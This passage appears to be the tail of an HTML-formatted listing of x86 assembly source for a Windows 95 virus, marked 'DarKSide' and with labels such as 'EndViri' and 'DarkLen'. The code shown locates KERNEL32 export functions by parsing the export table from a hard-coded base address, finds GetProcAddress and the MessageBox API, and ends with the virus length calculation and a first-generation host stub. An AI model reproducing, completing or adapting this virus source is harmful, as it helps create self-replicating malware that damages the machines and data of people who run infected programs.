        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GotIt</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MatchByte</span><span class="sc0">               </span><span class="sc1">;nope try next byte</span><span class="sc0">

</span><span class="sc5">NextOne</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">limit</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jge</span><span class="sc0">      </span><span class="sc5">not_found</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">;get the next pointer rva</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;and try again</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">TryAgain</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;note if not a match is found the all other from then on in are blank</span><span class="sc0">
</span><span class="sc1">;in other words dont mispell ,or ask for for a function that is not in</span><span class="sc0">
</span><span class="sc1">; KERNEL32</span><span class="sc0">
</span><span class="sc1">;esi = the 0 at the end of the name of the strings given to us to look for</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;cx = the index into the AddOrd</span><span class="sc0">
</span><span class="sc1">;take Nindex * 4 + [AddOrd] = Ordinal</span><span class="sc0">
</span><span class="sc1">;Ordinal * 4 + [AddFunc] should be the rva to the fuction</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;get set for next search routine</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;*2 looking into a word array</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddOrd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;here ax equals the ordinal - the base</span><span class="sc0">
</span><span class="sc1">;if ordinal is passed to hear then we should be able to skip</span><span class="sc0">
</span><span class="sc1">;searching for a name and hit here</span><span class="sc0">
</span><span class="sc1">;not sure of course but it tested on a few that I tried</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">;*4 looking into a dword array</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProc</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_error</span><span class="sc0">
        
</span><span class="sc5">Not95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;if the header of the kernel</span><span class="sc0">
                                        </span><span class="sc1">;is not there forget it, its not</span><span class="sc0">
                                        </span><span class="sc1">; the Win95 we know and love ;)        </span><span class="sc0">

</span><span class="sc5">not_found</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; String pass to us is not a </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; valid fucntion name</span><span class="sc0">

</span><span class="sc5">over_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Create</span><span class="sc0">                      </span><span class="sc1">;the data area</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">    </span><span class="sc1">;name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loopfind</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProc</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;inc     eax</span><span class="sc0">
        </span><span class="sc1">;mov     edx,dword ptr[eax]</span><span class="sc0">
        </span><span class="sc1">;mov     [ebp + ebx],edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetProc</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">allDone</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">loopfind</span><span class="sc0">
</span><span class="sc5">allDone</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;we might be lucky and have everthing we need now we get the</span><span class="sc0">
</span><span class="sc1">;message box api</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">User</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetMod</span><span class="sc4">]</span><span class="sc0">         
         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Messb</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                      </span><span class="sc1">;push the offset of theAPI we want</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; push the handle        </span><span class="sc0">
       
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessBox</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save it</span><span class="sc0">


</span><span class="sc5">getout</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">;YEA HARD CODED &lt;SIGH&gt;</span><span class="sc0">

</span><span class="sc1">;kern            dd      0BFF70000h      ;must add to all rva's</span><span class="sc0">





</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">              </span><span class="sc12">'DarKSide'</span><span class="sc0">
</span><span class="sc5">EndViri</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">oldip</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fini1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">DarkLen</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc5">EndViri</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">fini1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;doesnt matter in 95 what this is</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Beep</span><span class="sc0">             </span><span class="sc1">;Test</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">;call    dword ptr edi          ;when I used the routine to locate</span><span class="sc0">
                                        </span><span class="sc1">;the ExitProcess address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;this simply terminates the program</span><span class="sc0">

         </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">


</span></div></body>
</html>
